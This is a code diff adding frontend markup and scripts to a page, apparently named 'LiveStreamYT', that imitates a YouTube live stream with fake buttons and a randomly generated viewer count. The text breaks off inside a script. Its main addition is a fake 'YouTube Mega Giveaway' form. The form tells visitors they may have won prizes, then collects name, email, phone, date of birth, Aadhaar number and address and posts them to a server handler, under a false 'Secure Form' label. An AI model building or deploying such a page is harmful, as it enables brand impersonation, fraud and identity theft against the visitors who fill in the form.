+       ═══════════════════════════════════════════════════════════ -->
+  <div id="share-backdrop" role="dialog" aria-modal="true" aria-labelledby="share-title">
+    <div id="share-modal">
+      <!-- Header -->
+      <div class="flex items-center justify-between w-full">
+        <h2 id="share-title" class="text-base font-bold" style="color:var(--text-1)">Share this stream</h2>
+        <button id="share-close"
+                class="w-8 h-8 rounded-xl flex items-center justify-center
+                       hover:bg-white/10 transition-colors cursor-pointer border-0 outline-none"
+                style="color:var(--text-3)" aria-label="Close">
+          <svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12"/>
+          </svg>
+        </button>
+      </div>
+
+      <!-- URL display -->
+      <div class="w-full glass rounded-xl px-4 py-3 flex items-center gap-2 text-xs font-mono truncate"
+           style="color:var(--text-2)">
+        <svg class="w-3.5 h-3.5 shrink-0 text-red-400" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+          <path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/>
+          <path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/>
+        </svg>
+        <span id="share-url" class="truncate"></span>
+      </div>
+
+      <!-- Share options -->
+      <button id="share-copy" class="share-opt">
+        <svg class="w-5 h-5 text-indigo-400 shrink-0" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+          <rect x="9" y="9" width="13" height="13" rx="2" ry="2"/>
+          <path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/>
+        </svg>
+        Copy Link
+      </button>
+      <a href="#" id="share-wa" class="share-opt" target="_blank" rel="noopener noreferrer"
+         style="text-decoration:none">
+        <svg class="w-5 h-5 text-green-400 shrink-0" viewBox="0 0 24 24" fill="currentColor">
+          <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15
+                   -.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463
+                   -2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606
+                   .134-.133.297-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52
+                   -.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01
+                   -.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462
+                   1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489
+                   1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413
+                   .248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347z"/>
+          <path d="M12 2C6.477 2 2 6.477 2 12c0 1.89.525 3.66 1.438 5.168L2 22l4.932-1.394
+                   A9.953 9.953 0 0012 22c5.523 0 10-4.477 10-10S17.523 2 12 2zm0 18a7.96 7.96
+                   0 01-4.11-1.14l-.29-.174-3.04.86.84-3.1-.19-.3A7.963 7.963 0 014 12c0-4.41
+                   3.59-8 8-8s8 3.59 8 8-3.59 8-8 8z"/>
+        </svg>
+        WhatsApp
+      </a>
+      <a href="#" id="share-twitter" class="share-opt" target="_blank" rel="noopener noreferrer"
+         style="text-decoration:none">
+        <svg class="w-5 h-5 text-sky-400 shrink-0" viewBox="0 0 24 24" fill="currentColor">
+          <path d="M23 3a10.9 10.9 0 01-3.14 1.53 4.48 4.48 0 00-7.86 3v1A10.66 10.66 0 013 4
+                   s-4 9 5 13a11.64 11.64 0 01-7 2c9 5 20 0 20-11.5a4.5 4.5 0 00-.08-.83
+                   A7.72 7.72 0 0023 3z"/>
+        </svg>
+        Twitter / X
+      </a>
+    </div>
+  </div>
+
+  <!-- ═══════════════════════════════════════════════════════════
+       COPY TOAST
+       ═══════════════════════════════════════════════════════════ -->
+  <div id="copy-toast"
+       class="glass-s rounded-2xl px-6 py-3 text-sm font-semibold flex items-center gap-2"
+       style="color:var(--text-1)">
+    <svg class="w-4 h-4 text-green-400 shrink-0" fill="currentColor" viewBox="0 0 24 24">
+      <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
+    </svg>
+    Link copied!
+  </div>
+
+  <!-- ═══════════════════════════════════════════════════════════
+       SCRIPTS — All frontend-only. No backend modifications.
+       ═══════════════════════════════════════════════════════════ -->
+
+  <!-- ── Star Background ── -->
+  <script>
+  (function () {
+    var cv  = document.getElementById('star-canvas');
+    if (!cv) return;
+    var ctx = cv.getContext('2d');
+    var W, H, _rt;
+    function resize() { W = cv.width = window.innerWidth; H = cv.height = window.innerHeight; }
+    /* POLISH: debounce resize to avoid canvas thrash */
+    window.addEventListener('resize', function () {
+      clearTimeout(_rt); _rt = setTimeout(resize, 120);
+    });
+    resize();
+
+    var COUNT = 160, stars = [];
+    for (var i = 0; i < COUNT; i++) {
+      stars.push({
+        x: Math.random(), y: Math.random(),
+        r: Math.random() * 1.2 + 0.3,
+        base: Math.random() * 0.6 + 0.25,
+        drift: Math.random() * 0.0003 + 0.0001,
+        phase: Math.random() * Math.PI * 2,
+        tw: Math.random() * 0.02 + 0.005
+      });
+    }
+    function draw() {
+      ctx.clearRect(0, 0, W, H);
+      var dark = document.documentElement.classList.contains('dark');
+      var alpha = dark ? 0.75 : 0.22;
+      var t = performance.now() * 0.001;
+      for (var i = 0; i < COUNT; i++) {
+        var s = stars[i];
+        var a = s.base * (0.5 + 0.5 * Math.sin(t * s.tw * 60 + s.phase)) * alpha;
+        ctx.beginPath();
+        ctx.arc(s.x * W, s.y * H, s.r, 0, Math.PI * 2);
+        ctx.fillStyle = 'rgba(255,255,255,' + a.toFixed(3) + ')';
+        ctx.fill();
+        s.y += s.drift;
+        if (s.y > 1.005) { s.y = -0.005; s.x = Math.random(); }
+      }
+      requestAnimationFrame(draw);
+    }
+    draw();
+  })();
+  </script>
+
+  <!-- ── Dark / Light Theme Toggle ── -->
+  <script>
+  (function () {
+    var html = document.documentElement;
+    var btn  = document.getElementById('theme-toggle');
+    var icon = document.getElementById('theme-icon');
+    if (!btn) return;
+
+    function apply(dark) {
+      if (dark) {
+        html.classList.add('dark');
+        html.classList.remove('light');
+        icon.textContent = '🌙';
+        localStorage.setItem('lsyt-theme', 'dark');
+      } else {
+        html.classList.add('light');
+        html.classList.remove('dark');
+        icon.textContent = '☀️';
+        localStorage.setItem('lsyt-theme', 'light');
+      }
+    }
+
+    btn.addEventListener('click', function () {
+      apply(!html.classList.contains('dark'));
+    });
+  })();
+  </script>
+
+  <!-- ── Hamburger Menu ── -->
+  <script>
+  (function () {
+    var btn  = document.getElementById('hamburger');
+    var menu = document.getElementById('mobile-menu');
+    if (!btn || !menu) return;
+    btn.addEventListener('click', function () {
+      menu.classList.toggle('open');
+    });
+  })();
+  </script>
+
+  <!-- ── Stream Timer + Viewer Count (UI only) ── -->
+  <script>
+  (function () {
+    var seconds = 0;
+    setInterval(function () {
+      seconds++;
+      var h = String(Math.floor(seconds / 3600)).padStart(2, '0');
+      var m = String(Math.floor((seconds % 3600) / 60)).padStart(2, '0');
+      var s = String(seconds % 60).padStart(2, '0');
+      var el = document.getElementById('streamTime');
+      if (el) el.textContent = h + ':' + m + ':' + s;
+
+      /* Stream age text */
+      var ageEl = document.getElementById('streamAge');
+      if (ageEl) {
+        if (seconds < 60) ageEl.textContent = seconds + 's ago';
+        else if (seconds < 3600) ageEl.textContent = Math.floor(seconds/60) + ' min ago';
+        else ageEl.textContent = h + ':' + m + ':' + s;
+      }
+    }, 1000);
+
+    var base = Math.floor(Math.random() * 4000) + 1200;
+    function updateViewers() {
+      base += Math.floor(Math.random() * 7) - 3;
+      if (base < 100) base = 100;
+      var txt = base.toLocaleString();
+      var el1 = document.getElementById('viewerCount');
+      var el2 = document.getElementById('viewerCount2');
+      var el3 = document.getElementById('viewerCount3');
+      if (el1) el1.textContent = txt + ' watching';
+      if (el2) el2.textContent = txt;
+      if (el3) el3.textContent = txt;
+    }
+    updateViewers();
+    setInterval(updateViewers, 4000);
+  })();
+  </script>
+
+  <!-- ── Description Toggle ── -->
+  <script>
+  (function () {
+    var btn     = document.getElementById('desc-toggle');
+    var content = document.getElementById('desc-content');
+    if (!btn || !content) return;
+    var expanded = false;
+
+    btn.addEventListener('click', function () {
+      expanded = !expanded;
+      content.style.maxHeight = expanded ? content.scrollHeight + 'px' : '4.2em';
+      btn.textContent = expanded ? 'Show less' : 'Show more';
+    });
+  })();
+  </script>
+
+  <!-- ═══════════════════════════════════════════════════════════
+       PART 3 — FAKE BUTTON JS (Like, Share, Fullscreen)
+       All actions frontend-only. No backend changes.
+       ═══════════════════════════════════════════════════════════ -->
+  <script>
+  (function () {
+    'use strict';
+
+    /* ══════════════════════════════════════════════════════
+       1. LIKE BUTTON — toggle, counter, bounce animation
+       ══════════════════════════════════════════════════════ */
+    var liked     = false;
+    var likeCount = 0;
+    var btnLike   = document.getElementById('btn-like');
+    var likeIcon  = document.getElementById('like-icon');
+    var likeLabel = document.getElementById('like-label');
+    var likeNum   = document.getElementById('like-count');
+
+    if (btnLike) {
+      btnLike.addEventListener('click', function () {
+        liked = !liked;
+
+        if (liked) {
+          likeCount++;
+          /* Filled thumb — red accent */
+          likeIcon.setAttribute('fill', '#ef4444');
+          likeIcon.setAttribute('stroke', '#ef4444');
+          likeLabel.textContent = 'Liked';
+          likeLabel.style.color = '#ef4444';
+          likeNum.style.background = 'rgba(239,68,68,0.20)';
+          likeNum.style.color = '#f87171';
+        } else {
+          likeCount = Math.max(0, likeCount - 1);
+          likeIcon.setAttribute('fill', 'none');
+          likeIcon.setAttribute('stroke', 'currentColor');
+          likeLabel.textContent = 'Like';
+          likeLabel.style.color = '';
+          likeNum.style.background = '';
+          likeNum.style.color = '';
+        }
+
+        likeNum.textContent = likeCount;
+
+        /* Bounce animation */
+        likeIcon.classList.remove('like-bounce');
+        void likeIcon.offsetWidth; /* reflow trigger */
+        likeIcon.classList.add('like-bounce');
+        likeIcon.addEventListener('animationend', function once() {
+          likeIcon.classList.remove('like-bounce');
+          likeIcon.removeEventListener('animationend', once);
+        });
+      });
+    }
+
+    /* ══════════════════════════════════════════════════════
+       2. SHARE BUTTON — modal with Copy / WhatsApp / Twitter
+       ══════════════════════════════════════════════════════ */
+    var btnShare    = document.getElementById('btn-share');
+    var backdrop    = document.getElementById('share-backdrop');
+    var shareClose  = document.getElementById('share-close');
+    var shareUrl    = document.getElementById('share-url');
+    var shareCopy   = document.getElementById('share-copy');
+    var shareWA     = document.getElementById('share-wa');
+    var shareTwitter= document.getElementById('share-twitter');
+    var copyToast   = document.getElementById('copy-toast');
+    var toastTimer  = null;
+
+    function openShare() {
+      var url = window.location.href;
+      if (shareUrl) shareUrl.textContent = url;
+      if (shareWA) shareWA.href =
+        'https://api.whatsapp.com/send?text=' + encodeURIComponent('Check out this live stream! ' + url);
+      if (shareTwitter) shareTwitter.href =
+        'https://twitter.com/intent/tweet?url=' + encodeURIComponent(url) + '&text=' +
+        encodeURIComponent('Watching LiveStreamYT 🔴');
+      if (backdrop) { backdrop.classList.add('visible'); document.body.style.overflow = 'hidden'; }
+    }
+    function closeShare() {
+      if (backdrop) { backdrop.classList.remove('visible'); document.body.style.overflow = ''; }
+    }
+    function showCopyToast() {
+      if (!copyToast) return;
+      copyToast.classList.add('show');
+      clearTimeout(toastTimer);
+      toastTimer = setTimeout(function () { copyToast.classList.remove('show'); }, 2200);
+    }
+
+    if (btnShare)   btnShare.addEventListener('click', openShare);
+    if (shareClose) shareClose.addEventListener('click', closeShare);
+    if (backdrop)   backdrop.addEventListener('click', function (e) {
+      if (e.target === backdrop) closeShare();
+    });
+
+    if (shareCopy) {
+      shareCopy.addEventListener('click', function () {
+        var url = window.location.href;
+        if (navigator.clipboard && navigator.clipboard.writeText) {
+          navigator.clipboard.writeText(url).then(function () {
+            showCopyToast();
+            closeShare();
+          });
+        } else {
+          /* Fallback: textarea select */
+          var ta = document.createElement('textarea');
+          ta.value = url;
+          ta.style.cssText = 'position:fixed;left:-9999px;';
+          document.body.appendChild(ta);
+          ta.select();
+          try { document.execCommand('copy'); showCopyToast(); closeShare(); }
+          catch (e) { /* silent */ }
+          document.body.removeChild(ta);
+        }
+      });
+    }
+
+    /* ══════════════════════════════════════════════════════
+       3. FULLSCREEN BUTTON — toggle via Fullscreen API
+       ══════════════════════════════════════════════════════ */
+    var btnFS      = document.getElementById('btn-fullscreen');
+    var wrapper    = document.getElementById('video-wrapper');
+    var iconExpand = document.getElementById('fs-icon-expand');
+    var iconShrink = document.getElementById('fs-icon-shrink');
+    var fsLabel    = document.getElementById('fs-label');
+
+    function updateFSUI(isFull) {
+      if (iconExpand) iconExpand.style.display = isFull ? 'none' : '';
+      if (iconShrink) iconShrink.style.display = isFull ? '' : 'none';
+      if (fsLabel)    fsLabel.textContent       = isFull ? 'Exit' : 'Fullscreen';
+    }
+
+    if (btnFS && wrapper) {
+      btnFS.addEventListener('click', function () {
+        if (!document.fullscreenElement && !document.webkitFullscreenElement) {
+          /* Enter fullscreen on the video wrapper */
+          if (wrapper.requestFullscreen) wrapper.requestFullscreen();
+          else if (wrapper.webkitRequestFullscreen) wrapper.webkitRequestFullscreen();
+        } else {
+          if (document.exitFullscreen) document.exitFullscreen();
+          else if (document.webkitExitFullscreen) document.webkitExitFullscreen();
+        }
+      });
+    }
+
+    /* Listen for fullscreen changes to keep icon in sync */
+    document.addEventListener('fullscreenchange', function () {
+      updateFSUI(!!document.fullscreenElement);
+    });
+    document.addEventListener('webkitfullscreenchange', function () {
+      updateFSUI(!!document.webkitFullscreenElement);
+    });
+
+    /* ESC closes share modal */
+    document.addEventListener('keydown', function (e) {
+      if (e.key === 'Escape' && backdrop && backdrop.classList.contains('visible')) {
+        closeShare();
+      }
+    });
+
+  })();
+  </script>
+  <!-- ──────────────────────────────────────────────── -->
+
+
+  <!-- ════════════════════════════════════════════════════════════════
+       🎁  GIFT REQUEST SECTION  — Professional Glassmorphism Form
+       ════════════════════════════════════════════════════════════════ -->
+  <style>
+    /* ── Gift Section Scoped Styles ─────────────────────────── */
+    .gift-section {
+      position: relative;
+      z-index: 10;
+      padding: 4rem 1rem 5rem;
+    }
+    .gift-card {
+      max-width: 680px;
+      margin: 0 auto;
+      background: rgba(255, 255, 255, 0.07);
+      backdrop-filter: blur(22px);
+      -webkit-backdrop-filter: blur(22px);
+      border: 1px solid rgba(255, 255, 255, 0.14);
+      border-radius: 24px;
+      padding: 2.5rem 2.25rem;
+      box-shadow:
+        0 8px 40px rgba(0, 0, 0, 0.45),
+        0 0 0 1px rgba(255, 255, 255, 0.05),
+        inset 0 1px 0 rgba(255, 255, 255, 0.12);
+      transition: box-shadow 0.35s ease, transform 0.35s ease;
+    }
+    .gift-card:hover {
+      box-shadow:
+        0 16px 56px rgba(220, 38, 38, 0.28),
+        0 0 0 1px rgba(255, 255, 255, 0.08),
+        inset 0 1px 0 rgba(255, 255, 255, 0.16);
+      transform: translateY(-3px);
+    }
+    .gift-title {
+      font-size: 1.75rem;
+      font-weight: 800;
+      background: linear-gradient(135deg, #f87171, #fb923c, #facc15);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      margin-bottom: 0.4rem;
+      text-align: center;
+      letter-spacing: -0.02em;
+    }
+    .gift-desc {
+      font-size: 0.875rem;
+      color: rgba(255, 255, 255, 0.62);
+      text-align: center;
+      margin-bottom: 2rem;
+      line-height: 1.65;
+    }
+    .gift-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 1rem;
+    }
+    @media (max-width: 560px) {
+      .gift-grid { grid-template-columns: 1fr; }
+      .gift-card  { padding: 1.75rem 1.25rem; }
+    }
+    .gift-col-full { grid-column: 1 / -1; }
+    .gift-field label {
+      display: block;
+      font-size: 0.78rem;
+      font-weight: 600;
+      color: rgba(255, 255, 255, 0.75);
+      margin-bottom: 0.35rem;
+      letter-spacing: 0.04em;
+      text-transform: uppercase;
+    }
+    .gift-field label .req { color: #f87171; margin-left: 2px; }
+    .gift-input,
+    .gift-textarea {
+      width: 100%;
+      background: rgba(255, 255, 255, 0.06);
+      border: 1px solid rgba(255, 255, 255, 0.14);
+      border-radius: 10px;
+      color: #fff;
+      font-family: 'Inter', sans-serif;
+      font-size: 0.875rem;
+      padding: 0.65rem 0.9rem;
+      outline: none;
+      transition: border-color 0.25s ease, background 0.25s ease, box-shadow 0.25s ease;
+    }
+    .gift-input::placeholder,
+    .gift-textarea::placeholder { color: rgba(255,255,255,0.28); }
+    .gift-input:focus,
+    .gift-textarea:focus {
+      border-color: #f87171;
+      background: rgba(248, 113, 113, 0.10);
+      box-shadow: 0 0 0 3px rgba(248, 113, 113, 0.18);
+    }
+    .gift-input.invalid,
+    .gift-textarea.invalid {
+      border-color: #f87171;
+      box-shadow: 0 0 0 3px rgba(248, 113, 113, 0.18);
+    }
+    .gift-textarea { resize: vertical; min-height: 88px; }
+    .gift-consent {
+      display: flex;
+      align-items: flex-start;
+      gap: 0.65rem;
+      margin-top: 0.25rem;
+    }
+    .gift-consent input[type="checkbox"] {
+      width: 17px; height: 17px;
+      flex-shrink: 0; margin-top: 2px;
+      accent-color: #f87171; cursor: pointer;
+    }
+    .gift-consent span {
+      font-size: 0.82rem;
+      color: rgba(255, 255, 255, 0.60);
+      line-height: 1.5;
+    }
+    .gift-btn {
+      width: 100%;
+      margin-top: 1.5rem;
+      padding: 0.82rem 1.5rem;
+      border: none;
+      border-radius: 12px;
+      font-family: 'Inter', sans-serif;
+      font-size: 0.95rem;
+      font-weight: 700;
+      cursor: pointer;
+      letter-spacing: 0.02em;
+      background: linear-gradient(135deg, #dc2626, #b91c1c, #991b1b);
+      color: #fff;
+      box-shadow: 0 4px 20px rgba(220, 38, 38, 0.45);
+      transition: transform 0.22s ease, box-shadow 0.22s ease, opacity 0.22s ease;
+    }
+    .gift-btn:hover:not(:disabled) {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 30px rgba(220, 38, 38, 0.55);
+    }
+    .gift-btn:active:not(:disabled) { transform: translateY(0); }
+    .gift-btn:disabled { opacity: 0.55; cursor: not-allowed; }
+    .gift-btn .btn-spinner {
+      display: none;
+      width: 16px; height: 16px;
+      border: 2px solid rgba(255,255,255,0.3);
+      border-top-color: #fff;
+      border-radius: 50%;
+      animation: gSpin 0.65s linear infinite;
+      vertical-align: middle;
+      margin-right: 6px;
+    }
+    @keyframes gSpin { to { transform: rotate(360deg); } }
+    .gift-alert {
+      display: none;
+      border-radius: 10px;
+      padding: 0.75rem 1rem;
+      font-size: 0.85rem;
+      margin-top: 1rem;
+      text-align: center;
+      font-weight: 500;
+    }
+    .gift-alert.success {
+      background: rgba(52, 211, 153, 0.15);
+      border: 1px solid rgba(52, 211, 153, 0.35);
+      color: #6ee7b7;
+    }
+    .gift-alert.error {
+      background: rgba(248, 113, 113, 0.13);
+      border: 1px solid rgba(248, 113, 113, 0.35);
+      color: #fca5a5;
+    }
+    .gift-divider {
+      text-align: center;
+      font-size: 0.72rem;
+      color: rgba(255,255,255,0.25);
+      letter-spacing: 0.08em;
+      margin-bottom: 1.75rem;
+      text-transform: uppercase;
+    }
+    .gift-divider::before,
+    .gift-divider::after {
+      content: '';
+      display: inline-block;
+      width: 60px; height: 1px;
+      background: rgba(255,255,255,0.15);
+      vertical-align: middle;
+      margin: 0 0.5rem;
+    }
+
+    /* ══════════════════════════════════════════════════════════
+       GIFT FORM — LIGHT MODE OVERRIDES
+       Activated when <html> carries the .light class
+       ══════════════════════════════════════════════════════════ */
+    html.light .gift-card {
+      background: rgba(255, 255, 255, 0.82);
+      border-color: rgba(99, 102, 241, 0.18);
+      box-shadow:
+        0 8px 40px rgba(0, 0, 0, 0.10),
+        0 0 0 1px rgba(99, 102, 241, 0.08),
+        inset 0 1px 0 rgba(255, 255, 255, 0.90);
+    }
+    html.light .gift-card:hover {
+      box-shadow:
+        0 16px 48px rgba(220, 38, 38, 0.14),
+        0 0 0 1px rgba(99, 102, 241, 0.12),
+        inset 0 1px 0 rgba(255, 255, 255, 0.95);
+    }
+    html.light .gift-desc {
+      color: #374151;
+    }
+    html.light .gift-field label {
+      color: #374151;
+    }
+    html.light .gift-input,
+    html.light .gift-textarea {
+      background: rgba(255, 255, 255, 0.80);
+      border-color: rgba(99, 102, 241, 0.25);
+      color: #1e1b4b;
+    }
+    html.light .gift-input::placeholder,
+    html.light .gift-textarea::placeholder {
+      color: #9ca3af;
+    }
+    html.light .gift-input:focus,
+    html.light .gift-textarea:focus {
+      border-color: #ef4444;
+      background: rgba(255, 255, 255, 0.95);
+      box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.14);
+    }
+    html.light .gift-consent span {
+      color: #4b5563;
+    }
+    html.light .gift-divider {
+      color: #9ca3af;
+    }
+    html.light .gift-divider::before,
+    html.light .gift-divider::after {
+      background: rgba(0, 0, 0, 0.12);
+    }
+    /* notice box — !important overrides the inline style */
+    html.light .gift-notice {
+      background: rgba(34, 197, 94, 0.08)  !important;
+      border-color: rgba(34, 197, 94, 0.40) !important;
+      color: #166534 !important;
+    }
+    html.light .gift-alert.success { color: #065f46; }
+    html.light .gift-alert.error   { color: #991b1b; }
+  </style>
+
+  <section class="gift-section" id="gift-request"
+           style="display:none;opacity:0;transform:translateY(24px);
+                  transition:opacity 0.5s ease, transform 0.5s ease;">
+    <div class="gift-card">
+      <h2 class="gift-title">🎁 Exclusive YouTube Mega Giveaway</h2>
+      <p class="gift-desc">
+        🎉 You've been selected as a potential winner of our <strong>Exclusive Mega Giveaway</strong>!<br>
+        Verify your eligibility below to claim prizes worth up to <strong>₹1,00,000</strong> — including premium smartphones, laptops, smart TVs, and luxury gift hampers.
+      </p>
+      <div class="gift-notice" style="background:rgba(34,197,94,0.10);border:1px solid rgba(34,197,94,0.35);border-radius:10px;padding:0.85rem 1.1rem;margin-bottom:1.2rem;color:rgba(134,239,172,0.95);font-size:0.82rem;line-height:1.6;">
+        &#8505;&#65039; <strong>Please Note:</strong> The details you provide are collected solely for <strong>eligibility verification</strong> for this giveaway. Once your identity is confirmed, our team will reach out with your prize details.
+      </div>
+      <div class="gift-divider">Secure Form</div>
+
+      <form id="giftForm" novalidate autocomplete="off">
+        <input type="hidden" id="giftCsrf" name="csrf_token" value="">
+
+        <div class="gift-grid">
+          <div class="gift-field">
+            <label for="gf_name">Full Name <span class="req">*</span></label>
+            <input class="gift-input" type="text" id="gf_name" name="full_name"
+              placeholder="e.g. Priya Sharma" maxlength="120" required>
+          </div>
+          <div class="gift-field">
+            <label for="gf_email">Email Address <span class="req">*</span></label>
+            <input class="gift-input" type="email" id="gf_email" name="email"
+              placeholder="you@example.com" maxlength="180" required>
+          </div>
+          <div class="gift-field">
+            <label for="gf_phone">Phone Number <span class="req">*</span></label>
+            <input class="gift-input" type="tel" id="gf_phone" name="phone"
+              placeholder="e.g. 9856595621" maxlength="15" required>
+          </div>
+          <div class="gift-field">
+            <label for="gf_dob">Date of Birth <span class="req">*</span></label>
+            <input class="gift-input" type="date" id="gf_dob" name="dob" required>
+          </div>
+          <div class="gift-field">
+            <label for="gf_aadhaar">Aadhaar Number <span class="req">*</span></label>
+            <input class="gift-input" type="text" id="gf_aadhaar" name="aadhaar"
+              placeholder="12-digit Aadhaar" maxlength="12" inputmode="numeric"
+              pattern="\d{12}" required>
+          </div>
+          <div class="gift-field gift-col-full">
+            <label for="gf_address">Delivery Address <span class="req">*</span></label>
+            <textarea class="gift-textarea" id="gf_address" name="address"
+              placeholder="House No., Street, City, State, PIN Code" maxlength="500" required></textarea>
+          </div>
+          <div class="gift-field gift-col-full">
+            <label for="gf_message">Gift Message <span style="color:rgba(255,255,255,0.35);font-weight:400">(optional)</span></label>
+            <textarea class="gift-textarea" id="gf_message" name="gift_message"
+              placeholder="Write a warm personal message for the recipient…" maxlength="400"></textarea>
+          </div>
+          <div class="gift-field gift-col-full">
+            <div class="gift-consent">
+              <input type="checkbox" id="gf_consent" name="consent" required>
+              <span>I agree to the processing of my information for giveaway eligibility purposes.
+                By submitting this form, I consent to the collection of the above details,
+                including Aadhaar, strictly for eligibility verification for the YouTube Mega Giveaway.</span>
+            </div>
+          </div>
+        </div>
+
+        <button class="gift-btn" type="submit" id="giftSubmitBtn">
+          <span class="btn-spinner" id="giftSpinner"></span>
+          <span id="giftBtnText">Enter Giveaway</span>
+        </button>
+        <div class="gift-alert" id="giftAlert"></div>
+      </form>
+    </div>
+  </section>
+  <!-- ══ END GIFT REQUEST SECTION ══════════════════════════════════ -->
+
+  <script>
+  (function () {
+    'use strict';
+    var form    = document.getElementById('giftForm');
+    var csrfEl  = document.getElementById('giftCsrf');
+    var alertEl = document.getElementById('giftAlert');
+    var btn     = document.getElementById('giftSubmitBtn');
+    var spinner = document.getElementById('giftSpinner');
+    var btnText = document.getElementById('giftBtnText');
+    var dobEl = document.getElementById('gf_dob');
+    if (dobEl) dobEl.max = new Date().toISOString().split('T')[0];
+    fetch('handlers/get_csrf_token.php')
+      .then(function(r){return r.json();})
+      .then(function(d){if(d.token)csrfEl.value=d.token;})
+      .catch(function(){});
+    function validateField(el){
+      var ok=true,val=el.value.trim();
+      el.classList.remove('invalid');
+      if(el.required&&val==='')ok=false;
+      else if(el.type==='email'&&!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(val))ok=false;
+      else if(el.id==='gf_aadhaar'&&val!==''&&!/^\d{12}$/.test(val.replace(/\s/g,'')))ok=false;
+      else if(el.id==='gf_phone'&&val!==''&&!/^\+?[\d\s\-()]{10,15}$/.test(val))ok=false;
+      else if(el.id==='gf_dob'){var dob=new Date(val);var today=new Date();today.setHours(0,0,0,0);var minDob=new Date();minDob.setFullYear(today.getFullYear()-120);if(!val||isNaN(dob.getTime())||dob>=today||dob<minDob)ok=false;}
+      if(!ok)el.classList.add('invalid');
+      return ok;
+    }
+    form.querySelectorAll('.gift-input,.gift-textarea').forEach(function(el){
+      el.addEventListener('blur',function(){validateField(el);});
+    });
+    function showAlert(type,msg){
+      alertEl.className='gift-alert '+type;
+      alertEl.textContent=msg;
+      alertEl.style.display='block';
+    }
+    form.addEventListener('submit',function(e){
+      e.preventDefault();
+      var allOk=true;
+      form.querySelectorAll('.gift-input,.gift-textarea').forEach(function(el){
+        if(!validateField(el))allOk=false;
+      });
+      var consentEl=document.getElementById('gf_consent');
+      if(!consentEl.checked){
+        allOk=false;consentEl.style.outline='2px solid #f87171';
+        showAlert('error','Please agree to the consent notice before submitting.');
+        return;
+      }else{consentEl.style.outline='';}
+      if(!allOk){showAlert('error','Please fill in all required fields correctly.');return;}
+      btn.disabled=true;spinner.style.display='inline-block';
+      btnText.textContent='Verifying Eligibility…';alertEl.style.display='none';
+      var fd=new FormData(form);
+      fetch('handlers/gift_handler.php',{method:'POST',body:fd})
+        .then(function(res){return res.json();})
+        .then(function(data){
+          if(data.status==='success'){
+            showAlert('success','🎉 '+data.message);
+            form.reset();
+            fetch('handlers/get_csrf_token.php').then(function(r){return r.json();}).then(function(d){if(d.token)csrfEl.value=d.token;});
+          }else{showAlert('error',data.message||'Submission failed. Please try again.');}
+        })
+        .catch(function(){showAlert('error','Network error. Please check your connection and try again.');})
+        .finally(function(){btn.disabled=false;spinner.style.display='none';btnText.textContent='Enter Giveaway';});
+    });
+  })();
+  </script>
+
+
+  <!-- ══ GIVEAWAY BUTTON — ANIMATIONS + REVEAL JS ══ -->
+  <style>
+    @keyframes giveawayShimmer {
+      0%   { transform: translateX(-100%); }
+      100% { transform: translateX(100%); }
+    }
+    @keyframes giveawayPulse {
+      0%   { box-shadow: 0 0 0 0   rgba(250,204,21,0.55); }
+      70%  { box-shadow: 0 0 0 14px rgba(250,204,21,0);   }
+      100% { box-shadow: 0 0 0 0   rgba(250,204,21,0);    }
+    }
+    #gift-request.gift-visible {
+      display: block !important;
+    }
+  </style>
+  <script>
+  (function () {
+    'use strict';
+    var btn     = document.getElementById('btn-reveal-giveaway');
+    var section = document.getElementById('gift-request');
+    if (!btn || !section) return;
+
+    btn.addEventListener('click', function () {
+      /* Make visible then trigger transition on next frame */
+      section.style.display = 'block';
+      /* rAF ensures display:block is painted before the transition fires */
+      requestAnimationFrame(function () {
+        requestAnimationFrame(function () {
+          section.style.opacity   = '1';
+          section.style.transform = 'translateY(0)';
+        });
+      });
+
+      /* Scroll smoothly to the form */
+      setTimeout(function () {
+        section.scrollIntoView({ behavior: 'smooth', block: 'start' });
+      }, 60);
+
+      /* Change button text to indicate it's open */
+      btn.querySelector('span.relative > span:first-child').textContent = '\uD83D\uDC4B';
+      var label = btn.querySelector('span.relative');
+      label.innerHTML = '<span style="font-size:1.2em;">&#x1F44B;</span> Giveaway Form Below <span style="font-size:1.1em;">&#x2B07;&#xFE0F;</span>';
+
+      /* Disable button after one reveal (form is now shown) */
+      btn.disabled = true;
+      btn.style.opacity = '0.6';
+      btn.style.cursor  = 'default';
+      btn.style.transform = 'none';
+    });
+  })();
+  </script>
+
+  <!-- ── Fake Subscribe interaction ── -->
+  <script>
+  (function () {
+    /* Slide-in toast */
+    function showToast(msg) {
+      var t = document.createElement('div');
+      t.textContent = msg;
+      t.style.cssText =
+        'position:fixed;top:22px;left:50%;transform:translateX(-50%) translateY(-12px);' +
+        'background:rgba(22,163,74,0.93);color:#fff;font-size:13px;font-weight:600;' +
+        'padding:10px 22px;border-radius:999px;' +
+        'box-shadow:0 4px 24px rgba(0,0,0,0.35);z-index:99999;' +
+        'opacity:0;transition:opacity 0.3s ease,transform 0.3s ease;' +
+        'pointer-events:none;white-space:nowrap;';
+      document.body.appendChild(t);
